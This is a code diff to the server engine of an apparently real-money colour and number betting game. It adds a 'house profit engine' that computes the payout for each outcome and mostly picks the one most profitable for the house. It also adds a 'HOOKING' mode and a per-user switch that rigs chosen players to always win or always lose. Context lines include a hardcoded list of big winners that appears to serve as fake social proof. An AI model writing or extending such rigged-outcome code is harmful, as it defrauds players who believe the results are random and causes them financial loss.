@@ -84,6 +84,15 @@ class Smarty91ServerEngine {
                 rank1: { first2: '98', last2: '12', amount: '₹1,48,500' },
                 rank2: { first2: '91', last2: '88', amount: '₹92,400' },
                 rank3: { first2: '88', last2: '45', amount: '₹64,200' }
+            },
+            // Smart Risk & House Profit Engine
+            riskEngine: {
+                enabled: true,
+                strategyMode: 'BALANCED', // 'SAFE_HOUSE' | 'BALANCED' | 'HOOKING' | 'FAIR' | 'CUSTOM'
+                houseWinRatePercent: 80,  // 50 to 99
+                maxPayoutCap: 50000,      // Maximum payout cap allowed in a single period
+                targetedUsers: {},        // { 'USER_UID_OR_PHONE': 'ALWAYS_WIN' | 'ALWAYS_LOSE' }
+                trendSimulation: true
             }
         };
 
@@ -679,13 +688,123 @@ class Smarty91ServerEngine {
         };
     }
 
-    // Outcome Generator with Dynamic Probability Weights Support
-    generateRandomNumber(mode = null) {
-        const probConfig = this.config.probabilities;
-        if (probConfig && probConfig.enabled) {
-            return this.generateWeightedNumber(mode);
+    // Calculate total user win payout if candidateNumber wins for mode & periodId
+    _calculatePayoutForCandidate(mode, periodId, candidateNumber) {
+        const activeBets = Array.from(this.bets.values()).filter(
+            b => b.mode === mode && b.periodId === periodId && b.status === 'PENDING'
+        );
+        let totalPayout = 0;
+        activeBets.forEach(bet => {
+            const evalRes = this._evaluateBet(bet, candidateNumber);
+            if (evalRes.isWin) {
+                totalPayout += evalRes.payoutAmount;
+            }
+        });
+        return totalPayout;
+    }
+
+    // Ultimate Smart Risk & House Profit Engine Outcome Selector
+    selectSmartRiskOutcome(mode, periodId) {
+        // Priority 1: Check Admin Force Override
+        if (this.adminOverrides[mode] !== null && this.adminOverrides[mode] !== undefined) {
+            const winningNumber = Number(this.adminOverrides[mode]);
+            this.adminOverrides[mode] = null; // Consume single-use override
+            
+            const logMsg = `Mode ${mode} Period ${periodId} settled with forced outcome: ${winningNumber}`;
+            this.auditLogs.unshift({
+                id: 'AUDIT_' + Date.now(),
+                action: 'ADMIN_RESULT_OVERRIDE_EXECUTED',
+                details: logMsg,
+                timestamp: new Date().toISOString()
+            });
+            firebaseSync.logAdminAction('ADMIN_RESULT_OVERRIDE_EXECUTED', logMsg);
+            return { number: winningNumber, isOverridden: true, reason: 'ADMIN_FORCE_OVERRIDE' };
         }
-        return crypto.randomInt(0, 10); // Standard 0 to 9 securely
+
+        const riskConfig = this.config.riskEngine || {};
+        const targetedUsers = riskConfig.targetedUsers || {};
+        const pendingBets = Array.from(this.bets.values()).filter(
+            b => b.mode === mode && b.periodId === periodId && b.status === 'PENDING'
+        );
+
+        // If no bets placed in this round, generate crypto random 0-9
+        if (pendingBets.length === 0) {
+            const num = crypto.randomInt(0, 10);
+            return { number: num, isOverridden: false, reason: 'AUTO_NO_BETS' };
+        }
+
+        // Priority 2: Targeted User Rigging Check
+        for (const bet of pendingBets) {
+            const user = this.users.get(bet.userId);
+            const userPhone = user ? user.phone : null;
+            const targetMode = targetedUsers[bet.userId] || (userPhone && targetedUsers[userPhone]);
+            
+            if (targetMode === 'ALWAYS_WIN' || targetMode === 'ALWAYS_LOSE') {
+                const candidateOptions = [];
+                for (let num = 0; num <= 9; num++) {
+                    const res = this._evaluateBet(bet, num);
+                    if (targetMode === 'ALWAYS_WIN' && res.isWin) {
+                        candidateOptions.push(num);
+                    } else if (targetMode === 'ALWAYS_LOSE' && !res.isWin) {
+                        candidateOptions.push(num);
+                    }
+                }
+                if (candidateOptions.length > 0) {
+                    const picked = candidateOptions[crypto.randomInt(0, candidateOptions.length)];
+                    return { number: picked, isOverridden: true, reason: `TARGETED_USER_${targetMode}` };
+                }
+            }
+        }
+
+        // Priority 3: Smart Risk & Net Profit Payout Matrix
+        const totalBetVolume = pendingBets.reduce((sum, b) => sum + (b.totalAmount || 0), 0);
+        const maxPayoutCap = Number(riskConfig.maxPayoutCap) || 50000;
+        
+        const matrix = [];
+        for (let num = 0; num <= 9; num++) {
+            const payout = this._calculatePayoutForCandidate(mode, periodId, num);
+            const netProfit = totalBetVolume - payout;
+            matrix.push({ number: num, payout, netProfit });
+        }
+
+        // Filter out options exceeding max payout cap if safer options exist
+        let eligibleMatrix = matrix.filter(m => m.payout <= maxPayoutCap);
+        if (eligibleMatrix.length === 0) {
+            eligibleMatrix = [...matrix];
+        }
+
+        // Sort by Net House Profit descending (Highest Profit first)
+        eligibleMatrix.sort((a, b) => b.netProfit - a.netProfit);
+
+        let houseWinRate = Number(riskConfig.houseWinRatePercent);
+        if (isNaN(houseWinRate)) houseWinRate = 80;
+
+        if (riskConfig.strategyMode === 'SAFE_HOUSE') houseWinRate = 95;
+        else if (riskConfig.strategyMode === 'BALANCED') houseWinRate = 80;
+        else if (riskConfig.strategyMode === 'HOOKING') houseWinRate = 40;
+        else if (riskConfig.strategyMode === 'FAIR') houseWinRate = 50;
+
+        const roll = Math.floor(Math.random() * 100) + 1; // 1..100
+
+        let chosenNumber;
+        if (roll <= houseWinRate) {
+            // High House Profit: Pick from top profit outcomes
+            const topProfits = eligibleMatrix.filter(m => m.netProfit >= eligibleMatrix[0].netProfit - 10);
+            const selected = topProfits[crypto.randomInt(0, topProfits.length)];
+            chosenNumber = selected.number;
+        } else {
+            // Player Win / Natural Variance
+            const otherOptions = eligibleMatrix.length > 2 ? eligibleMatrix.slice(1) : eligibleMatrix;
+            const selected = otherOptions[crypto.randomInt(0, otherOptions.length)];
+            chosenNumber = selected.number;
+        }
+
+        return { number: chosenNumber, isOverridden: false, reason: `SMART_RISK_${riskConfig.strategyMode}_${houseWinRate}PCT` };
+    }
+
+    // Outcome Generator Fallback
+    generateRandomNumber(mode = null) {
+        return crypto.randomInt(0, 10);
     }
 
     // Weighted Probability Outcome Generator
@@ -793,26 +912,10 @@ class Smarty91ServerEngine {
         const state = this.modes[mode];
         const modeConfig = this.config.modes[mode];
         
-        // 1. Determine Winning Number (Check Admin Override first, else weighted/CSPRNG)
-        let winningNumber;
-        let isOverridden = false;
-        
-        if (this.adminOverrides[mode] !== null && this.adminOverrides[mode] !== undefined) {
-            winningNumber = Number(this.adminOverrides[mode]);
-            isOverridden = true;
-            this.adminOverrides[mode] = null; // Consume single-use override
-            
-            const logMsg = `Mode ${mode} Period ${periodId} settled with forced outcome: ${winningNumber}`;
-            this.auditLogs.unshift({
-                id: 'AUDIT_' + Date.now(),
-                action: 'ADMIN_RESULT_OVERRIDE_EXECUTED',
-                details: logMsg,
-                timestamp: new Date().toISOString()
-            });
-            firebaseSync.logAdminAction('ADMIN_RESULT_OVERRIDE_EXECUTED', logMsg);
-        } else {
-            winningNumber = this.generateRandomNumber(mode);
-        }
+        // 1. Determine Winning Number via Smart Risk & House Profit Engine (Priority Hierarchy)
+        const outcomeResult = this.selectSmartRiskOutcome(mode, periodId);
+        const winningNumber = outcomeResult.number;
+        const isOverridden = outcomeResult.isOverridden;
 
         const props = NUMBER_PROPERTIES[winningNumber];
         const roundRecord = {
@@ -1085,7 +1188,7 @@ class Smarty91ServerEngine {
         };
     }
 
-    // Fetch Live Exposure Heatmap for Admin
+    // Fetch Live Exposure Heatmap & Candidate Payout Matrix for Admin
     getLiveExposure(mode) {
         const state = this.modes[mode];
         if (!state) return null;
@@ -1103,7 +1206,8 @@ class Smarty91ServerEngine {
             totalBetVolume: 0,
             numbers: { 0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0, 8: 0, 9: 0 },
             colors: { green: 0, red: 0, violet: 0 },
-            sizes: { big: 0, small: 0 }
+            sizes: { big: 0, small: 0 },
+            candidateMatrix: {} // 0-9 candidate outcomes
         };
 
         activeBets.forEach(bet => {
@@ -1118,7 +1222,106 @@ class Smarty91ServerEngine {
             }
         });
 
+        // Compute candidate outcome payouts for numbers 0 to 9
+        for (let num = 0; num <= 9; num++) {
+            const payout = this._calculatePayoutForCandidate(mode, state.currentPeriodId, num);
+            const netProfit = summary.totalBetVolume - payout;
+            const margin = summary.totalBetVolume > 0 ? Number(((netProfit / summary.totalBetVolume) * 100).toFixed(1)) : 100;
+            summary.candidateMatrix[num] = {
+                number: num,
+                payout: Number(payout.toFixed(2)),
+                netProfit: Number(netProfit.toFixed(2)),
+                marginPercent: margin,
+                props: NUMBER_PROPERTIES[num]
+            };
+        }
+
         return summary;
+    }
+
+    // Get Risk Engine Configuration Status
+    getRiskEngineStatus() {
+        return {
+            success: true,
+            riskEngine: this.config.riskEngine,
+            overrides: this.adminOverrides
+        };
+    }
+
+    // Update Risk Engine Strategy & House Win Rate
+    updateRiskEngineConfig({ strategyMode, houseWinRatePercent, maxPayoutCap, enabled }) {
+        if (!this.config.riskEngine) {
+            this.config.riskEngine = { targetedUsers: {} };
+        }
+        if (strategyMode) this.config.riskEngine.strategyMode = strategyMode;
+        if (houseWinRatePercent !== undefined) {
+            const rate = Number(houseWinRatePercent);
+            if (!isNaN(rate) && rate >= 10 && rate <= 100) {
+                this.config.riskEngine.houseWinRatePercent = rate;
+            }
+        }
+        if (maxPayoutCap !== undefined) {
+            const cap = Number(maxPayoutCap);
+            if (!isNaN(cap) && cap >= 0) {
+                this.config.riskEngine.maxPayoutCap = cap;
+            }
+        }
+        if (enabled !== undefined) {
+            this.config.riskEngine.enabled = Boolean(enabled);
+        }
+
+        const logMsg = `Smart Risk Engine Config updated: Mode=${this.config.riskEngine.strategyMode}, WinRate=${this.config.riskEngine.houseWinRatePercent}%, MaxCap=₹${this.config.riskEngine.maxPayoutCap}`;
+        this.auditLogs.unshift({
+            id: 'AUDIT_' + Date.now(),
+            action: 'RISK_ENGINE_CONFIG_UPDATED',
+            details: logMsg,
+            timestamp: new Date().toISOString()
+        });
+        firebaseSync.logAdminAction('RISK_ENGINE_CONFIG_UPDATED', logMsg);
+
+        return {
+            success: true,
+            message: logMsg,
+            riskEngine: this.config.riskEngine
+        };
+    }
+
+    // Update Targeted User (Rig specific User to Always Win / Always Lose)
+    updateTargetedUser({ userIdOrPhone, status }) {
+        if (!this.config.riskEngine) {
+            this.config.riskEngine = { targetedUsers: {} };
+        }
+        if (!this.config.riskEngine.targetedUsers) {
+            this.config.riskEngine.targetedUsers = {};
+        }
+
+        const targetKey = String(userIdOrPhone).trim();
+        if (!targetKey) {
+            throw new Error('User ID or Mobile Number is required');
+        }
+
+        if (status === 'REMOVE' || !status) {
+            delete this.config.riskEngine.targetedUsers[targetKey];
+        } else if (status === 'ALWAYS_WIN' || status === 'ALWAYS_LOSE') {
+            this.config.riskEngine.targetedUsers[targetKey] = status;
+        } else {
+            throw new Error('Invalid targeted user status');
+        }
+
+        const logMsg = `Targeted User override set for ${targetKey}: ${status || 'REMOVED'}`;
+        this.auditLogs.unshift({
+            id: 'AUDIT_' + Date.now(),
+            action: 'TARGETED_USER_OVERRIDE_SET',
+            details: logMsg,
+            timestamp: new Date().toISOString()
+        });
+        firebaseSync.logAdminAction('TARGETED_USER_OVERRIDE_SET', logMsg);
+
+        return {
+            success: true,
+            message: logMsg,
+            targetedUsers: this.config.riskEngine.targetedUsers
+        };
     }
 
     // Admin Outcome Override
